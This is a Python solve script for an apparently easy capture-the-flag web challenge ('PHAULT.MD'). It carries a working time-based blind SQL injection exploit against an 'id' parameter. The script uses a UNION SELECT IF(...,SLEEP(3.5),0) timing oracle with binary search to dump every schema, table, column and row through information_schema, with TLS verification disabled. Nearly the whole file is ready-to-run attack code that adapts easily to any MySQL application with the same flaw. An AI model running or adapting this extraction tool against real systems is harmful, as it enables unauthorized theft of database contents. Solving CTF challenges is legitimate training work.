#!/usr/bin/env python3
"""PHAULT.MD — pwnsec.ctf.ae (web, Easy)
Blind SQLi timing-based extraction from index.php:
    $sql = "SELECT username FROM users WHERE id = " . $_GET["id"];
Response floor is 2.0s (usleep) -> use SLEEP > 2s as the oracle bit.

Oracle:  id = 1 UNION SELECT IF(<cond>,SLEEP(3.5),0)
  cond True  -> ~4.3s
  cond False -> ~2.8s
"""
import sys
import time
import requests
import urllib3

urllib3.disable_warnings()

HOST = sys.argv[1] if len(sys.argv) > 1 else "2ef0a7e84df29c0f.chal.ctf.ae"
BASE = f"https://{HOST}/"
SLEEP = 3.5
THRESH = 3.3
SAMPLES = 2

sess = requests.Session()
sess.verify = False


def time_id(payload: str) -> float:
    t0 = time.time()
    try:
        sess.get(BASE, params={"id": payload}, timeout=20)
    except requests.RequestException:
        pass
    return time.time() - t0


def oracle(cond: str, samples: int = SAMPLES) -> bool:
    p = f"1 UNION SELECT IF(({cond}),SLEEP({SLEEP}),0)"
    times = sorted(time_id(p) for _ in range(samples))
    return times[-1] > THRESH


def sanity_check() -> bool:
    t_true = sorted(time_id(f"1 UNION SELECT IF((1=1),SLEEP({SLEEP}),0)") for _ in range(3))
    t_false = sorted(time_id(f"1 UNION SELECT IF((1=2),SLEEP({SLEEP}),0)") for _ in range(3))
    print(f"[sanity] true={[round(x,2) for x in t_true]} false={[round(x,2) for x in t_false]}")
    return max(t_true) > THRESH and max(t_false) <= THRESH


def dump_string(expr: str, length_hint: int = 128) -> str:
    # length first
    n = 0
    for i in range(1, 512):
        if oracle(f"LENGTH({expr})>={i}"):
            n = i
        else:
            break
    if not n:
        return "(empty)"
    print(f"[len] {expr} = {n}")
    out = []
    for i in range(1, n + 1):
        lo, hi = 1, 255
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"ORD(SUBSTRING({expr},{i},1))>={mid}"):
                lo = mid + 1
            else:
                hi = mid
        out.append(chr(lo))
        sys.stdout.write(chr(lo))
        sys.stdout.flush()
    print()
    return "".join(out)


def main() -> None:
    if not sanity_check():
        print("[!] Oracle dead — DB not executing queries. Respawn/extend the instance and retry.")
        return
    print("[+] Oracle alive. Enumerating...")
    dbs = dump_string("GROUP_CONCAT(schema_name)", 200) if oracle(
        "1=(SELECT COUNT(*) FROM information_schema.schemata)"
    ) else ""
    # note: GROUP_CONCAT length guard above is approximate; refine below
    # Better: enumerate databases individually
    dbs = []
    i = 1
    while True:
        d = dump_string(f"(SELECT schema_name FROM information_schema.schemata LIMIT {i-1},1)")
        if d == "(empty)":
            break
        dbs.append(d)
        i += 1
    print("[dbs]", dbs)
    for db in dbs:
        print(f"[db] {db}")
        tables = []
        i = 1
        while True:
            t = dump_string(
                f"(SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {i-1},1)"
            )
            if t == "(empty)":
                break
            tables.append(t)
            i += 1
        print("[tables]", tables)
        for tbl in tables:
            cols = []
            i = 1
            while True:
                c = dump_string(
                    f"(SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{tbl}' LIMIT {i-1},1)"
                )
                if c == "(empty)":
                    break
                cols.append(c)
                i += 1
            print("[cols]", db, tbl, cols)
            for col in cols:
                vals = []
                i = 1
                while True:
                    v = dump_string(
                        f"(SELECT `{col}` FROM `{db}`.`{tbl}` LIMIT {i-1},1)"
                    )
                    if v == "(empty)":
                        break
                    vals.append(v)
                    i += 1
                print("[data]", db, tbl, col, vals)


if __name__ == "__main__":
    main()